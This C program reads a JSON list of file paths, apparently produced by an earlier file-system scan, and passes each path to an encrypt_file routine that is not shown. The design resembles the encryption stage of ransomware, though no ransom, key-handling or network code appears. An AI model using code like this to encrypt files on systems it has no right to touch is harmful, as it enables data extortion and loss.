#include <stdio.h>
#include "include/encryption.h"
#include "include/cjson/cJSON.h"

#define MAX_PATH_LEN 4096

typedef struct {
	char path[MAX_PATH_LEN];
	long file_size;
} FileEntry;

int main()
{
	FILE *file = fopen("output.json", "r");
	if (!file)
	{
		perror("output.json couldn't be opened");
		return 1;
	}

	fseek(file, 0, SEEK_END);
	long len = ftell(file);
	rewind(file);

	char *data = malloc(len + 1);
	if (!data)
	{
		fclose(file);
		fprintf(stderr, "Not enough memory\n");
		return 1;
	}

	fread(data, 1, len, file);
	data[len] = '\0';
	fclose(file);

	cJSON *json = cJSON_Parse(data);
	if (!json)
	{
		fprintf(stderr, "JSON parsing error: %s\n", cJSON_GetErrorPtr());
		free(data);
		return 1;
	}

	cJSON *files_array = cJSON_GetObjectItemCaseSensitive(json, "files");
	if (!cJSON_IsArray(files_array))
	{
		fprintf(stderr, "\"files\" not an array!\n");
		cJSON_Delete(json);
		free(data);
		return 1;
	}

	int i = 0;
	cJSON *file_item;
	cJSON_ArrayForEach(file_item, files_array)
	{
		cJSON *path = cJSON_GetObjectItemCaseSensitive(file_item, "path");
		cJSON *size = cJSON_GetObjectItemCaseSensitive(file_item, "file_size");

		if (cJSON_IsString(path) && cJSON_IsNumber(size))
		{
			printf("Encryting \"%s\"...\n", path->valuestring);
			encrypt_file(path->valuestring);
		}
	}

	cJSON *total = cJSON_GetObjectItemCaseSensitive(json, "total_file");
	if (cJSON_IsNumber(total))
	{
		printf("\nTotal file: %d\n", (int)total->valuedouble);
	}

	cJSON_Delete(json);
	free(data);
	return 0;
}